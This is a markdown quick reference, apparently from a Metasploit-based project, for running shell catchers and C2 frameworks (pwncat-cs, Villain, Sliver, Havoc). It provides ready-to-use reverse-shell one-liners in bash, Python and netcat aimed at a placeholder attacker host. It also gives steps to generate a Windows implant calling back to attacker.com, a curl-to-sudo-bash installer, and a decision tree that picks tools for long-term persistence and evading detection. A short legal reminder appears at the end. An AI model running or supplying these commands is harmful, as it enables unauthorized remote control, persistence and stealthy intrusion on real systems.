# Shell Catcher and C2 Quick Reference

## Quick Command Reference

### pwncat-cs - Advanced Shell Handler

```bash
# Start listener
use auxiliary/server/pwncat_listener
set LHOST 0.0.0.0
set LPORT 4444
set PLATFORM linux
run

# Features: Auto privilege escalation, file transfer, persistence
```

**Reverse Shell Commands:**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Netcat
nc ATTACKER 4444 -e /bin/bash
```

---

### Villain - Web-Based Shell Manager

```bash
# Start server
use auxiliary/server/villain_server
set SRVHOST 0.0.0.0
set SRVPORT 6666
run

# Access web UI at: http://localhost:6666
```

**Features:** Web UI, multiple shell types, payload generation

---

### Sliver - Professional C2 Framework

```bash
# 1. Start server
use auxiliary/integration/sliver_c2
set ACTION start_server
run

# 2. Start listener
use auxiliary/integration/sliver_c2
set ACTION start_listener
set LISTENER_PROTOCOL mtls
set LHOST 0.0.0.0
set LPORT 8888
run

# 3. Generate implant
use auxiliary/integration/sliver_c2
set ACTION generate
set IMPLANT_OS windows
set LHOST attacker.com
set OUTPUT_PATH /tmp/implant.exe
run
```

**Protocols:** mTLS (secure), HTTP(S), DNS (stealth), WireGuard

---

### Havoc - Modern GUI C2

```bash
# 1. Start teamserver
use auxiliary/integration/havoc_c2
set ACTION start_teamserver
set SRVHOST 0.0.0.0
set SRVPORT 40056
run

# 2. Start client (in another terminal)
use auxiliary/integration/havoc_c2
set ACTION start_client
run
```

**Features:** GUI teamserver, sleep obfuscation, indirect syscalls

---

## Decision Tree

**Need quick shell with auto privesc?**
→ Use **pwncat-cs**

**Managing 10+ systems?**
→ Use **Villain** (web UI) or **Sliver** (CLI)

**Long-term persistent access?**
→ Use **Sliver** (DNS) or **Havoc** (obfuscation)

**Team-based operation?**
→ Use **Havoc** (GUI) or **Sliver** (API)

**Evading detection?**
→ Use **Havoc** (indirect syscalls) or **Sliver** (DNS tunnel)

---

## Installation Quick Commands

```bash
# pwncat-cs
pip install pwncat-cs

# Villain
git clone https://github.com/t3l3machus/Villain.git /opt/Villain
pip install -r /opt/Villain/requirements.txt

# Sliver
curl https://sliver.sh/install | sudo bash

# Havoc
git clone https://github.com/HavocFramework/Havoc.git /opt/Havoc
# Follow /opt/Havoc/INSTALL.md
```

---

## Feature Comparison

| Tool | Type | UI | Auto PrivEsc | Multi-Protocol | Best For |
|------|------|----|--------------| ---------------|----------|
| **pwncat-cs** | Shell Handler | CLI | ✅ Yes | ❌ TCP only | Quick shells |
| **Villain** | Light C2 | Web | ❌ No | ⚠️ HTTP/HTTPS | Web management |
| **Sliver** | Full C2 | CLI+API | ✅ Yes | ✅ mTLS/HTTP/DNS/WG | Professional ops |
| **Havoc** | Full C2 | GUI | ✅ Yes | ✅ HTTP/HTTPS/SMB | Modern red team |

---

## Common Issues

**pwncat: "Connection drops immediately"**
```bash
# Ensure interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Sliver: "Implant won't connect"**
```bash
# Check listener
sliver-client -c "jobs"

# Try mTLS first (most reliable)
```

**Havoc: "Teamserver won't start"**
```bash
# Validate profile
python3 -c "import yaml; yaml.safe_load(open('profile.yaml'))"
```

---

## Legal Reminder

⚠️ **All tools require written authorization before use**

See `documentation/SHELL_CATCHER_C2_GUIDE.md` for full legal requirements.

---

## Learn More

- **Full Guide:** `documentation/SHELL_CATCHER_C2_GUIDE.md`
- **Integration Details:** `lib/msf/core/integrations/README.md`
- **Module Usage:** Check `modules/auxiliary/server/` and `modules/auxiliary/integration/`

---

**Version:** 1.0.0  
**Last Updated:** 2025-12-14
